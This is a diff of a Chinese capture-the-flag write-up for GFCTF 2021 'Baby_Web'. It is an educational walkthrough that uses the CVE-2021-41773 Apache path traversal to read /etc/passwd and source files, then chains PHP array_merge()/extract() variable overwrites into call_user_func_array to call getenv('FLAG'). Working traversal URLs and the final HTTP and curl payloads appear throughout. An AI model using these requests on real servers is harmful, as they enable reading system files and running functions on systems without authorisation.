@@ -1,24 +1,45 @@
+# [GFCTF 2021] Baby_Web
 
+## 基本信息
 
+- **题目名称**：[GFCTF 2021] Baby_Web
+- **题目链接**：[https://www.nssctf.cn/problem/883](https://www.nssctf.cn/problem/883)
+- **考点清单**：CVE-2021-41773、Apache 路径穿越、PHP 源码审计、`array_merge()`、`extract()`、变量覆盖、`call_user_func_array()`
+- **工具清单**：dirsearch、curl
 
+## 一、看到什么
 
-## 01_前言
+使用 dirsearch 对目标进行目录扫描：
 
-这道题目，源码审计类型
+```bash
+dirsearch -u "http://node4.anna.nssnode.cn:29022"
+```
 
-## 02_最佳实践
+![image-20261109141024023](GFCTF2021_Baby_Web/image-20261109141024023.png)
 
-`dirsearch -u "http://node4.anna.nssnode.cn:29022"`![image-20261109141024023](GFCTF2021_Baby_Web/image-20261109141024023.png)
+扫描发现 `/cgi-bin` 路径
 
-发现 `/cgi-bin`，结合之前学的 `CVE-2021-41773 Apache HTTP Server 2.4.49路径穿越漏洞`
+结合之前接触过的 **CVE-2021-41773 Apache HTTP Server 2.4.49 路径穿越漏洞**，尝试利用该路径进行命令执行，但未能成功，随后转向任意文件读取
 
-`/cgi-bin` 都出来了，尝试命令执行，但是不行唉，有回显，很长看不懂，估计命令执行功能被 forbidden 了
+测试读取 `/etc/passwd`：
 
-没招，只能用牛刀去任意文件读取了
+```text
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
 
-测试 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`![1794185611811](GFCTF2021_Baby_Web/1794185611811.png)
+成功触发路径穿越，页面提示：
 
-根据提示 `源码藏在上层目录xxx.php.txt里面`，读取 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/index.php.txt`
+```text
+源码藏在上层目录xxx.php.txt里面
+```
+
+根据提示读取入口文件源码：
+
+```text
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/index.php.txt
+```
+
+获得 `index.php` 源码：
 
 ```php
 <h1>Welcome To GFCTF 12th!!</h1>
@@ -26,892 +47,899 @@
 error_reporting(0);
 define("main","main");
 include "Class.php";
+
 $temp = new Temp($_POST);
 $temp->display($_GET['filename']);
-
 ?>
-<!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?-->
 ```
 
-根据提示，读取 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/Class.php.txt`：
+继续读取 `Class.php`：
+
+```text
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/Class.php.txt
+```
+
+获得核心类 `Temp` 的源码
+
+## 二、想到什么解题思路
+
+### 2.1 分析入口参数
+
+入口文件中存在两个外部可控参数：
 
 ```php
-<?php
-defined('main') or die("no!!"); 
-Class Temp{
-    private $date=['version'=>'1.0','img'=>'https://www.apache.org/img/asf-estd-1999-logo.jpg'];
-    private $template;
-    public function __construct($data){                       
-        $this->date = array_merge($this->date,$data);
+$temp = new Temp($_POST);
+$temp->display($_GET['filename']);
+```
+
+- `$_POST`：作为参数传入 `Temp` 构造函数
+- `$_GET['filename']`：传入 `display()`，用于控制模板名称
+
+因此，需要分别追踪 POST 参数和 GET 参数在后续代码中的流向
+
+### 2.2 分析模板加载逻辑
+
+`display()` 方法：
+
+```php
+public function display($template,$space=''){
+    extract($this->date);
+    $this->getTempName($template,$space);
+    include($this->template);
+}
+```
+
+`getTempName()` 方法：
+
+```php
+public function getTempName($template,$dir){
+    if($dir === 'admin'){
+        $this->template = str_replace('..','','./template/admin/'.$template);
+        if(!is_file($this->template)){
+            die("no!!");
+        }
     }
-    public function getTempName($template,$dir){
-        if($dir === 'admin'){
-            $this->template = str_replace('..','','./template/admin/'.$template);
-            if(!is_file($this->template)){
-                die("no!!");
-            }
-        }
-        else{
-            $this->template = './template/index.html';
-        }
-    }
-    public function display($template,$space=''){
-        extract($this->date);
-        $this->getTempName($template,$space);
-        include($this->template);
-    }
-    public function listdata($_params){
-        $system = [
-            'db' => '',
-            'app' => '',
-            'num' => '',
-            'sum' => '',
-            'form' => '',
-            'page' => '',
-            'site' => '',
-            'flag' => '',
-            'not_flag' => '',
-            'show_flag' => '',
-            'more' => '',
-            'catid' => '',
-            'field' => '',
-            'order' => '',
-            'space' => '',
-            'table' => '',
-            'table_site' => '',
-            'total' => '',
-            'join' => '',
-            'on' => '',
-            'action' => '',
-            'return' => '',
-            'sbpage' => '',
-            'module' => '',
-            'urlrule' => '',
-            'pagesize' => '',
-            'pagefile' => '',
-        ];
-
-        $param = $where = [];
-
-        $_params = trim($_params);
-
-        $params = explode(' ', $_params);
-        if (in_array($params[0], ['list','function'])) {
-            $params[0] = 'action='.$params[0];
-        }
-        foreach ($params as $t) {
-            $var = substr($t, 0, strpos($t, '='));
-            $val = substr($t, strpos($t, '=') + 1);
-            if (!$var) {
-                continue;
-            }
-            if (isset($system[$var])) { 
-                $system[$var] = $val;
-            } else {
-                $param[$var] = $val; 
-            }
-        }
-        // action
-        switch ($system['action']) {
-
-            case 'function':
-
-                if (!isset($param['name'])) {
-                    return  'hacker!!';
-                } elseif (!function_exists($param['name'])) {
-                    return 'hacker!!';
-                }
-
-                $force = $param['force'];
-                if (!$force) {
-                    $p = [];
-                    foreach ($param as $var => $t) {
-                        if (strpos($var, 'param') === 0) {
-                            $n = intval(substr($var, 5));
-                            $p[$n] = $t;
-                        }
-                    }
-                    if ($p) {
-
-                        $rt = call_user_func_array($param['name'], $p);
-                    } else {
-                        $rt = call_user_func($param['name']);
-                    }
-                    return $rt;
-                }else{
-                    return null;
-                }
-            case 'list':
-                return json_encode($this->date);
-        }
-        return null;
+    else{
+        $this->template = './template/index.html';
     }
 }
 ```
 
-两份主要文件都到手了，下面简单的分析一下
+最终通过 `include($this->template)` 加载模板文件
 
-通过分析 `index.php.txt` 可以看出 根页面提供了 `$_POST`、`$_GET['filename']` 
+其中，`$this->template` 由 `getTempName()` 控制，而模板路径取决于 `$dir` 的值
 
-作为可交互点
+只有满足 `$dir === 'admin'`，程序才会进入管理模板分支
 
+继续向上追踪：
 
+```php
+$this->getTempName($template,$space);
+```
 
-`$temp = new Temp($_POST);` 则意味这，POST 数组作为参数 `$data` 传进 `__construct($data)`
+这里的 `$dir` 实际对应 `$space`，而 `display()` 中 `$space` 的默认值为空字符串
 
-而 `filename` 则直接传给了 `Temp:display`
+因此，需要设法将 `$space` 修改为 `admin`
 
+注意到 `display()` 中存在：
 
+```php
+extract($this->date);
+```
 
-我们看 `Temp:display` 这个函数，发现 `include`，能任意文件读取吗
+`extract()` 可以将数组中的键值对提取为当前作用域中的变量
 
-得看 `$this->template` 这个参数，但变量 `$this->template` 是由函数 `Temp:getTempName` 控制的
+如果能够控制 `$this->date`，就可以通过其中的 `space` 键创建 `$space` 变量，从而覆盖原本的默认值
 
-可以看到，不管 `Temp:template` 中，两条条件分支，都不能控制这个 `$this->template`
+### 2.3 利用 array_merge() 与 extract() 控制模板分支
 
-它不可控，而且总是与 `template` 有关系
+构造函数：
 
+```php
+private $date = [
+    'version'=>'1.0',
+    'img'=>'https://www.apache.org/img/asf-estd-1999-logo.jpg'
+];
 
+public function __construct($data){
+    $this->date = array_merge($this->date,$data);
+}
+```
 
-但是是 `/template/` 还是 `/template/admin/`，跟进复杂度来看，也能知道要选择 `/template/admin`
+其中 `$data` 来自入口文件传入的 `$_POST`
 
-同时，在这个分支下，存在 `template` 的路径拼接，但由于 `str_replace` 的存在，可能无法完成 `../` 的路径穿越
+`array_merge()` 对于字符串键采用后面的数组覆盖前面的数组的规则
 
-但相对另一条分支，这条分支显然可折腾和可控的变量较多
+因此，可以通过 POST 参数覆盖或新增 `$this->date` 中的键值
 
+提交：
 
+```text
+space=admin
+```
 
+合并后，`$this->date` 中新增：
 
+```php
+[
+    'version' => '1.0',
+    'img' => 'https://www.apache.org/img/asf-estd-1999-logo.jpg',
+    'space' => 'admin'
+]
+```
 
-那这就要求 `$dir === 'admin'` 得成立
+随后执行：
 
+```php
+extract($this->date);
+```
 
+便会创建：
 
-`$dir` 即 `$this->getTemName` 调用时传入的 `$space`
+```php
+$space = 'admin';
+```
 
+最终使：
 
+```php
+$this->getTempName($template,$space);
+```
 
-而且 `$space` 在被 `$temp->display` 调用时，`$space` 默认是空
+满足：
 
+```php
+$dir === 'admin'
+```
 
+成功进入管理模板分支
 
-但是 `extract` 的作用是把一个字典的各个键值对，变成变量
+### 2.4 寻找可利用的模板文件
 
+进入管理模板分支后，模板路径由以下代码拼接：
 
+```php
+$this->template = str_replace('..','','./template/admin/'.$template);
+```
 
-那么 `$this->date` 是否可控，是否能写入个 `$space=admin`
+虽然 `$template` 可以通过 GET 参数 `filename` 控制，但 `str_replace()` 会删除其中的 `..`，因此无法直接利用 `../` 完成路径穿越
 
+不过，在前面的目录扫描中，已经发现 `/template/admin/index.html`
 
-
-我们发现，可行
-
-
-
-首先，`date` 是私有变量，在 `__construct` 时，通过 `array_merge` 对`$date` 和 `$data` 进行合并
-
-合并结果并返回给 `date`
-
-
-
-而这个 `data` 正是 `$temp = new Temp($_POST);`，通过 POST 数组形式传递过来的
-
-
-
-所以，我们只需要 post 提交 `space=admin`，那么就能造成，在进入 `getTempName` 的时候，`$space` 即 `$dir` 为 `admin`
-
-
-
-行，现在我们已经成功进入 `$dir === 'admin'` 这条分支，并可以通过访问根页面 GET 传参 `$filename` 的方式，控制变量 `template`
-
-
-
-虽然无法通过路径穿越进行文件读取，但是我们在进行 `dirsearch` 的时候，发现了 `/template/admin/index.html`
-
-其内容是，`listdata("action=list module=$mod");`
-
-
-
-那如果，我们能 `include /template/admin/index.html` 就意味着，我们的主战场将转移到 `Temp:listdata`，算是柳暗花明的又一线索吧
-
-
-
-
-
-看看 `Temp:listdata`
-
-代码很长，但是主要分为两部分，switch 之前，和 switch 之后
-
-
-
-刚上来第一步，就碰到了传进来的参数 `$_params`，这里的 `$_params`，即为 `action=list module=$mod`
-
-
-
-`$mod` 可以跟刚才处理 `$space` 或者说 `$dir` 相同的方法，进行赋值和利用
-
-ouk，有一个可控点
-
-
-
-我们先不管这个 `module=$mod` 是杂利用的，我们接着看代码
-
-
-
-进入一个 if 判断，需要 `$params` 中的第一个变量是 `list` 或者 `function`
-
-
-
-`$params` 咋来的，是通过 `explode(' ', $_params)` 过来的
-
-
-
-`$_params` 是我们传参过来的，即 `action=list module=$mod`
-
-而 `explode` 则是按照空格进行分割并形成字典：
+查看该模板文件，发现其中存在：
+
+```php
+listdata("action=list module=$mod");
+```
+
+这意味着，只要能够加载 `index.html`，就可以进一步控制 `listdata()` 接收到的参数
+
+因此，GET 参数可以指定：
+
+```text
+?filename=index.html
+```
+
+结合 POST 参数 `space=admin`，即可加载管理模板
+
+接下来需要分析 `listdata()` 方法
+
+### 2.5 分析 listdata() 的参数解析逻辑
+
+核心代码：
+
+```php
+public function listdata($_params){
+    $system = [
+        'db' => '',
+        'app' => '',
+        'num' => '',
+        'sum' => '',
+        'form' => '',
+        'page' => '',
+        'site' => '',
+        'flag' => '',
+        'not_flag' => '',
+        'show_flag' => '',
+        'more' => '',
+        'catid' => '',
+        'field' => '',
+        'order' => '',
+        'space' => '',
+        'table' => '',
+        'table_site' => '',
+        'total' => '',
+        'join' => '',
+        'on' => '',
+        'action' => '',
+        'return' => '',
+        'sbpage' => '',
+        'module' => '',
+        'urlrule' => '',
+        'pagesize' => '',
+        'pagefile' => '',
+    ];
+
+    $param = $where = [];
+
+    $_params = trim($_params);
+
+    $params = explode(' ', $_params);
+
+    if (in_array($params[0], ['list','function'])) {
+        $params[0] = 'action='.$params[0];
+    }
+
+    foreach ($params as $t) {
+        $var = substr($t, 0, strpos($t, '='));
+        $val = substr($t, strpos($t, '=') + 1);
+
+        if (!$var) {
+            continue;
+        }
+
+        if (isset($system[$var])) {
+            $system[$var] = $val;
+        } else {
+            $param[$var] = $val;
+        }
+    }
+
+    switch ($system['action']) {
+        // ...
+    }
+}
+```
+
+模板传入的原始参数为：
+
+```php
+$_params = "action=list module=$mod";
+```
+
+首先通过 `explode(' ', $_params)` 按照空格拆分字符串
+
+假设 `$mod` 未进行修改，拆分结果类似：
 
 ```php
 $params = [
     0 => 'action=list',
-    1 => 'module=user',
+    1 => 'module=user'
 ];
 ```
 
-
-
-得，我们的 `$params` 的第一个变量是 `action=list`，差了十万里远
-
-
-
-拜拜勒您嘞，继续往下看
-
-
-
-来到一个 `foreach`这里
-
-看着听唬人的
-
-但是，只要明白
+随后进入 `foreach`，通过 `substr()` 和 `strpos()` 将每个字符串拆分为键值对
 
 ```php
 $var = substr($t, 0, strpos($t, '='));
 $val = substr($t, strpos($t, '=') + 1);
 ```
 
-就好办了
+再根据 `$var` 是否存在于 `$system` 中，决定将参数存入 `$system` 还是 `$param`
 
+其中：
 
+- `$system`：存放预先定义的系统参数，例如 `action`、`module`
+- `$param`：存放其他参数，例如后续需要使用的 `name`、`param0`
 
-其主要功能是把 `key=value` 形式的字符串拆成 key 和 val
-
-并分别以 key 做键，val 做值的形式
-
-然后再看看，拆出来的 key，在不在最开始声明的 `$system` 里呀
-
-如果在就添加到数组 `$system`
-
-如果不在，就去数组 `$param`
-
-
-
-
-
-其实也就是将刚刚 explode 拆成的字典，把一个个 `$params[i] => 'key=value'` 给提炼出来
-
-变成 `$system[key] = value` 或者 `$param[key] = value`
-
-
-
-
-
-行，经过这一折腾
-
-`$param` 就成了 ` `
-
-`$system` 就成了 `..., action => list， module => '$mod', ...`
-
-
-
-别多想，还是刚刚浏览器中传进来的参数
-
-
-
-接下来，要进入 switch 了
-
-
-
-需要取值进行判断，取出来一看是 `list`，于是直接来到 `return json_encode($this->date)`
-
-
-
-`this->date` 我们分析过来，也清楚是啥了，又不是可利用点，给我这干嘛
-
-
-
-随即，全剧终
-
-
-
-ouk，我们遇到了 listdata 中，第一个不如意的地方，我们需要让 `action=function`
-
-
-
-这样才能进入 `case 'function'`，这样才能有机会走到 `call_user_func` 去嘿嘿嘿
-
-
-
-回来想想，如何让 `action = function` 那，好像刚刚走一路，也没发现 listdata 中存在可利用点呀
-
-
-
-但不要忘记，我们有 `$mod` 呀
-
-
-
-如果我 post 传参是 `mod=xxx action=function`
-
-
-
-那么这个 `mod` 就能通过 construct 中的 array_merge，并顺手被 extract 变成 `$mod=xxx action=function`
-
-
-
-随即，便很流畅的进入了 `action=list module=xxx action=function`
-
-
-
-再经过刚刚的 foreach，来个变量覆盖，action 成功伪造成了 function
-
-`$param` 就成了 ` `
-
-`$system` 就成了 `..., action => function， module => '$mod', ...`
-
-
-
-这是好事哇
-
-紧接着，我们就有了能前往 case 'function' 的资格了
-
-
-
-关于这里，为什么是 `mod=xxx action=function` 而不是 `mod=action=function`：
-
-模板拼接：
+正常情况下，最终得到：
 
 ```php
-"action=list module=$mod" => "action=list module=action=function"
+$system['action'] = 'list';
+$system['module'] = 'user';
 ```
 
-`explode(' ')` 结果：
+随后进入：
 
 ```php
-[
-  0 => 'action=list',
-  1 => 'module=action=function',
-]
+switch ($system['action'])
 ```
 
-进 foreach 解析：
+由于 `action=list`，程序执行：
 
 ```php
-// token 0
-$var = 'action';  $val = 'list';    → $system['action'] = 'list'
-// token 1
-$var = 'module';  $val = 'action=function';  → $system['module'] = 'action=function'
+case 'list':
+    return json_encode($this->date);
 ```
 
+这并不是最终需要的执行分支
 
+目标是让 `$system['action']` 变为 `function`，从而进入函数调用逻辑
 
+### 2.6 利用 mod 参数覆盖 action
 
+回到模板中的参数拼接：
 
-首先，`!isset($param['name'])` 要求我们的 `$param['name']` 得存在得有值
+```php
+listdata("action=list module=$mod");
+```
 
-否则，就要被当成 `hacker!!` 给扔外面了
+其中 `$mod` 同样可以通过前面的 `array_merge()` 和 `extract()` 进行控制
 
+如果 POST 参数设置为：
 
+```text
+mod=xxx action=function
+```
 
-没事好吧，一会 post 传参的时候，在 `mod=xxx action=function name=xxxx` 后面填几笔就可以了
+经过变量提取后：
 
-先来放个 `name=xxxx` 占个位
+```php
+$mod = 'xxx action=function';
+```
 
+模板拼接得到：
 
+```text
+action=list module=xxx action=function
+```
 
-然后看到我们有 `name` 了
+再次经过：
 
-就进入了下一关
+```php
+$params = explode(' ', $_params);
+```
 
-通过 function_exists 看看，这个 `name` 是不是 PHP 的内置函数
+得到：
 
-> `function_exists()` 返回 false 是 PHP 8.0+ 的行为
+```php
+$params = [
+    0 => 'action=list',
+    1 => 'module=xxx',
+    2 => 'action=function'
+];
+```
+
+进入 `foreach` 后，逐个解析：
+
+```php
+// 第一个参数
+action=list
+
+// 第二个参数
+module=xxx
+
+// 第三个参数
+action=function
+```
+
+由于 `action` 是 `$system` 中已经存在的键，因此第三个参数会再次执行：
+
+```php
+$system['action'] = 'function';
+```
+
+成功覆盖之前的 `list`，最终进入：
+
+```php
+case 'function':
+```
+
+> 这里需要注意参数的空格位置
 >
-> 这是关键版本差异：
+> **正确写法：**
 >
-> - **PHP < 8.0**：`disable_functions` 只是禁止"调用"，函数仍注册在函数表里，`function_exists('system')` 返回 **true**。调用时会报 warning 并返回 `null`。
-> - **PHP >= 8.0**：被禁用的函数会从函数表中移除，`function_exists('system')` 返回 **false**。
+> ```text
+> mod=xxx action=function
+> ```
 >
-> `function_exists('scandir(getcwd())')` **这种写法无法通过检查，它会返回 `false`**
+> **错误写法：**
+>
+> ```text
+> mod=action=function
+> ```
+>
+> 错误写法经过模板拼接后：
+>
+> ```text
+> action=list module=action=function
+> ```
+>
+> `explode(' ', $_params)` 的结果为：
+>
+> ```php
+> [
+>     0 => 'action=list',
+>     1 => 'module=action=function'
+> ]
+> ```
+>
+> 第二个参数整体被解析为：
+>
+> ```php
+> $system['module'] = 'action=function';
+> ```
+>
+> 无法覆盖 `$system['action']`
 
-如果是，那就放行，如果不是，那就 game over 了
+### 2.7 分析 function 分支
 
+核心代码：
 
+```php
+case 'function':
 
-行，这里得记一笔，一会回来补 name 的时候，得是一个 PHP 的内置函数
+    if (!isset($param['name'])) {
+        return 'hacker!!';
+    } elseif (!function_exists($param['name'])) {
+        return 'hacker!!';
+    }
 
+    $force = $param['force'];
 
+    if (!$force) {
+        $p = [];
 
-行，继续往下看，从 $param['force'] 中，取了一个值给 force
+        foreach ($param as $var => $t) {
+            if (strpos($var, 'param') === 0) {
+                $n = intval(substr($var, 5));
+                $p[$n] = $t;
+            }
+        }
 
-然后进行 `!$force` 的判断
+        if ($p) {
+            $rt = call_user_func_array($param['name'], $p);
+        } else {
+            $rt = call_user_func($param['name']);
+        }
 
+        return $rt;
+    } else {
+        return null;
+    }
+```
 
+首先，需要满足：
 
-看到我们心心念的 `call_user_func` 在里面，那我们肯定希望 `!$force` 结果为 True 了
+```php
+isset($param['name'])
+```
 
+因此需要传入 `name` 参数
 
+随后通过：
 
-那么 $force 得为 false，
+```php
+function_exists($param['name'])
+```
 
+检查对应的函数是否存在
 
+这里要求传入的是函数名，而不是函数调用表达式
 
-这不巧了，本来 $param 中就没有 force，那刚刚还取值赋值，原来是个 null 呀
+例如：
 
+```php
+function_exists('getenv');       // true
+function_exists('getenv(FLAG)'); // false
+```
 
+因此，可以选择 PHP 内置函数 `getenv`
 
-`!null` 为真，直接过
+接着：
 
+```php
+$force = $param['force'];
 
+if (!$force)
+```
 
-那这里就不用管了，直接跟进，看看下一步
+由于没有传入 `force` 参数，`$force` 为 `null`
 
+而 `!null` 为 `true`，因此可以进入函数调用分支
 
+### 2.8 构造函数参数
 
-首先先定义一个 $p，并用 foreach 进行个处理
+继续分析：
 
+```php
+$p = [];
 
+foreach ($param as $var => $t) {
+    if (strpos($var, 'param') === 0) {
+        $n = intval(substr($var, 5));
+        $p[$n] = $t;
+    }
+}
+```
 
-先不看这个 foreach，直接看后面的 if-else
+这段代码会遍历 `$param`，筛选所有以 `param` 开头的键
 
+例如传入：
 
+```text
+param0=FLAG
+```
 
-我们可以发现，如果我们跳过 foreach，那么 $p 为空，我们来到 `call_user_func($param['name'])`
+执行：
 
+```php
+substr($var, 5)
+```
 
+得到：
 
-尝试 `space=admin&mod=xxx action=function name=getenv`，但是回显除了一个 `Array` 外，啥也没有
+```text
+0
+```
+
+再通过：
+
+```php
+intval('0')
+```
+
+得到整数 `0`
+
+最终：
+
+```php
+$p[0] = 'FLAG';
+```
+
+构造出：
+
+```php
+$p = [
+    0 => 'FLAG'
+];
+```
+
+随后进入：
+
+```php
+$rt = call_user_func_array($param['name'], $p);
+```
+
+相当于执行：
+
+```php
+getenv('FLAG');
+```
+
+最终返回环境变量 `FLAG` 的值
+
+## 三、尝试过程和结果记录
+
+### 3.1 第一次尝试：不传入函数参数
+
+构造 POST 参数：
+
+```text
+space=admin&mod=xxx action=function name=getenv
+```
+
+此时 `$p` 为空，程序进入：
+
+```php
+$rt = call_user_func($param['name']);
+```
+
+相当于：
+
+```php
+getenv();
+```
+
+`getenv()` 在不传入参数时返回环境变量数组，因此页面回显：
+
+```text
+Array
+```
+
+这说明已经成功进入 `function` 分支，并成功调用了 `getenv()`
+
+但还没有获取指定的环境变量
 
 ![image-20261109180108262](GFCTF2021_Baby_Web/image-20261109180108262.png)
 
+### 3.2 第二次尝试：传入 FLAG 参数
 
+根据前面的参数解析逻辑，需要让 `$p` 中存在：
 
-那看来得试试 `getenv(“FLAG”)` 了
+```php
+$p[0] = 'FLAG';
+```
 
+因此，在 `name=getenv` 后增加：
 
+```text
+param0=FLAG
+```
 
-那这就不得不看看 foreach 了
+最终 POST 数据：
 
-因为我们的 call_user_func_array 中需要的 `$p=FLAG` 就是在这里产生的
+```text
+space=admin&mod=xxx action=function name=getenv param0=FLAG
+```
 
+此时：
 
+```php
+$param = [
+    'name' => 'getenv',
+    'param0' => 'FLAG'
+];
+```
 
-首先，foreach 会遍历每个键值对
+经过 `foreach` 处理：
 
-并将键值分别赋值给 var 和 t
+```php
+$p = [
+    0 => 'FLAG'
+];
+```
 
+最终执行：
 
+```php
+getenv('FLAG');
+```
 
-其次，看看键 var 这个字符串中，是否是 param 开头的
+成功获取环境变量中的 FLAG
 
+![png](GFCTF2021_Baby_Web/.png)
 
+### 3.3 最终 Payload
 
-上一步必须为 True，那一会就在 `name=getenv` 后面加个 paramxxxx=FLAG
+<badge color="success">成功利用</badge>
 
+- bp 抓包：
 
-
-随后到了 `$n = intval(substr($var, 5))`
-
-
-
-`substr($var, 5)` 就是截取 var,`paramxxxx`，从第六个字符开始，直到字符串末尾
-
-
-
-然后，做个 intval 给 $n
-
-
-
-接下来，$n 将进入字典 $p ，当作 FLAG 的键存在
-
-
-
-于是乎，经过 foreach，我们的 $p 变成了 ['intval(xxxx)'=>"FLAG"]
-
-
-
-接下来就能美美读 flag 了
-
-```html
+```http
 POST /?filename=index.html HTTP/1.1
 
-space=admin&mod=xxx action=function name=getenv param=FLAG
+space=admin&mod=xxx action=function name=getenv param0=FLAG
 ```
 
+- curl 发送请求：
 
-
-![image-20261109134729161](GFCTF2021_Baby_Web/image-20261109134729161.png)
-
-
-
-跟风大佬，再记一笔，`curl` 的操作姿势：
-
-```shell
-curl -s "http://node4.anna.nssctf.cn:20884/?filename=index.html" -d "space=admin&mod=0%20action=function%20name=getenv%20param0=FLAG"
+```bash
+curl -s "http://node4.anna.nssctf.cn:20884/?filename=index.html" \
+-d "space=admin&mod=0%20action=function%20name=getenv%20param0=FLAG"
 ```
+
+其中 `%20` 表示空格，用于分隔 `mod` 中的多个参数
 
 ![image-20261109094520901](GFCTF2021_Baby_Web/image-20261109094520901.png)
 
+## 四、总结与反思
 
+### 4.1 完整利用链
 
-<a id="appendix"></a>
-
-## 附录·源码审计 and 解读
-
-
-
+```text
+Apache CVE-2021-41773
+        |
+        v
+读取 index.php.txt、Class.php.txt
+        |
+        v
+分析入口参数 $_POST、$_GET
+        |
+        v
+array_merge() 合并 POST 数据
+        |
+        v
+extract() 提取变量
+        |
+        +----------------------+
+        |                      |
+        v                      v
+   space=admin          mod=xxx action=function
+        |                      |
+        v                      v
+进入 admin 模板分支      拼接 listdata 参数
+        |                      |
+        v                      v
+加载 index.html          explode() 按空格拆分
+        |                      |
+        v                      v
+调用 listdata()          foreach 解析键值对
+        |                      |
+        |                      v
+        |               覆盖 action=function
+        |                      |
+        +----------+-----------+
+                   |
+                   v
+             进入 function 分支
+                   |
+                   v
+             name=getenv
+                   |
+                   v
+             param0=FLAG
+                   |
+                   v
+          call_user_func_array()
+                   |
+                   v
+              getenv('FLAG')
+                   |
+                   v
+                获取 FLAG
 ```
-创建 Temp 对象
-    |
-    v
-初始化默认数据
-    |
-    v
-调用 display()
-    |
-    +---- extract() 提取数据
-    |
-    +---- getTempName() 选择模板
-    |
-    +---- include() 加载模板
 
-另一个入口：
-    |
-    v
-调用 listdata($_params)
-    |
-    v
-解析参数字符串
-    |
-    v
-判断 action
-    |
-    +---- function：调用 PHP 函数
-    |
-    +---- list：返回 JSON 数据
-```
+### 4.2 关键知识点
 
+| 知识点 | 利用作用 |
+| :--- | :--- |
+| CVE-2021-41773 | 通过路径穿越读取 PHP 源码 |
+| `array_merge()` | 利用字符串键覆盖和新增 POST 数据 |
+| `extract()` | 将数组键值提取为变量，实现变量覆盖 |
+| `explode()` | 按空格拆分模板传入的参数字符串 |
+| `substr()`、`strpos()` | 将 `key=value` 拆分为键和值 |
+| `function_exists()` | 检查指定函数是否存在 |
+| `call_user_func()` | 无参数时动态调用指定函数 |
+| `call_user_func_array()` | 通过数组传递函数参数 |
+| `getenv()` | 获取指定环境变量 |
 
+### 4.3 审计思路
 
-> 外部传入的数据可以控制对象内部的哪些属性值？这些数据后续又被传给了哪些危险函数？
->
-> 这就是代码审计时需要追踪的数据流。
+这道题的核心并不是单独利用某个危险函数，而是沿着外部输入的数据流，逐步找到能够影响程序执行逻辑的位置
 
+审计时可以按照以下顺序进行：
 
+1. **定位入口参数**：找到 `$_POST`、`$_GET` 等外部输入
+2. **追踪变量流向**：分析参数进入构造函数后如何影响对象属性
+3. **寻找变量覆盖**：关注 `array_merge()`、`extract()` 等可能改变变量值的操作
+4. **分析函数调用链**：追踪模板加载、参数拼接和函数调用之间的关系
+5. **构造最终参数**：根据参数解析规则，确定每个键值应该如何传递
 
-## 补充阅读
+本题中最关键的两次控制：
 
+- 第一次通过 `space=admin` 控制模板加载分支
+- 第二次通过 `mod=xxx action=function` 覆盖 `listdata()` 中的 `action` 参数
 
+最终通过 `name=getenv param0=FLAG` 控制动态函数调用及其参数
 
-`$param = $where = [];` 链式赋值
+## 五、补充知识
+
+### 5.1 array_merge()
+
+`array_merge()` 用于合并多个数组
+
+对于不同类型的键，处理方式有所区别：
+
+| 键类型 | 处理规则 |
+| :--- | :--- |
+| 数字键 | 重新编号，从 0 开始 |
+| 字符串键 | 后面的数组覆盖前面的同名键 |
+
+本题利用的是字符串键覆盖和新增：
 
 ```php
-$where = [];
-$param = $where;   // 也就是 $param = []
+$a = [
+    'version' => '1.0',
+    'img' => 'default.jpg'
+];
+
+$b = [
+    'img' => 'new.jpg',
+    'space' => 'admin'
+];
+
+$result = array_merge($a, $b);
 ```
 
-
-
-`defined()`：检查常量是否定义
-
-Demo：
+结果：
 
 ```php
-<?php
-define('main', true);
-
-defined('main') or die("no!!");
-
-echo "程序正常运行";
-```
-
-输出：
-
-```
-程序正常运行
-```
-
-如果删除：
-
-```php
-define('main', true);
-```
-
-输出：
-
-```
-no!!
-```
-
-这里的目的通常是防止用户直接访问某个 PHP 文件。
-
-注意：它只是简单的访问入口限制，并不是完整的安全验证。
-
-
-
-
-
-`array_merge()`：合并数组
-
-```php
-// 索引数组 —— 直接追加、重新编号
-$a = ['a', 'b'];
-$b = ['c', 'd'];
-
-var_dump(array_merge($a, $b));
-// [0=>'a', 1=>'b', 2=>'c', 3=>'d']
-
-
-// 字索引键（数字键）会被重新从 0 编号，不是简单拼接原键
-$a = [5 => 'x'];
-$b = [10 => 'y'];
-var_dump(array_merge($a, $b));
-// [0=>'x', 1=>'y']   ⚠️ 原来的键 5、10 没了，重新编号
-
-
-// 字符串键（关联数组）—— 后者覆盖前者
-$a = ['name' => 'zigyr', 'img' => 'default.jpg'];
-$b = ['img' => 'new.jpg', 'version' => '2.0'];
-
-var_dump(array_merge($a, $b));
-/*
 [
-  'name'    => 'zigyr',
-  'img'     => 'new.jpg',   ← $b 覆盖了 $a 的 img
-  'version' => '2.0',
+    'version' => '1.0',
+    'img' => 'new.jpg',
+    'space' => 'admin'
 ]
-*/
-
-
-// 混合键 —— 数字重新编号，字符串覆盖
-$a = [1 => 'a', 'k' => 'v1'];
-$b = [2 => 'b', 'k' => 'v2'];
-
-var_dump(array_merge($a, $b));
-/*
-[
-  0   => 'a',     数字键重编号
-  1   => 'b',
-  'k' => 'v2',   字符串键覆盖
-]
-*/
-
-
-// 多数组 + 空数组
-var_dump(array_merge([1,2], [], [3,4]));
-// [1,2,3,4]  ✅ 空数组无影响
-
-var_dump(array_merge());
-// []         ✅ PHP 7.4+ 无参返回空数组
-
-
-// 和 + 运算符的区别
-$a = [1 => 'a', 2 => 'b'];
-$b = [1 => 'x', 3 => 'c'];
-
-var_dump($a + $b);
-// [1=>'a', 2=>'b', 3=>'c']          ← 数字键保留！重复键前者胜
-
-var_dump(array_merge($a, $b));
-// [0=>'a', 1=>'b', 2=>'x', 3=>'c']  ← 数字键重编号，全部保留
 ```
 
-1. **数字键会被重编号**，无法保留原始索引。要保留键用 `+` 或 `array_replace`
+### 5.2 extract()
 
-2. **字符串键后者覆盖前者**（同名时），不是报错
-
-3. **参数必须全是数组**。传非数组（`null`、字符串、对象）：
-
-   - PHP 8+：抛 `TypeError`
-   - PHP 7：发 `Warning` 并返回 `null`
-
-4. **不递归**：嵌套数组只合最外层，内层整个被覆盖：
-
-   ```php
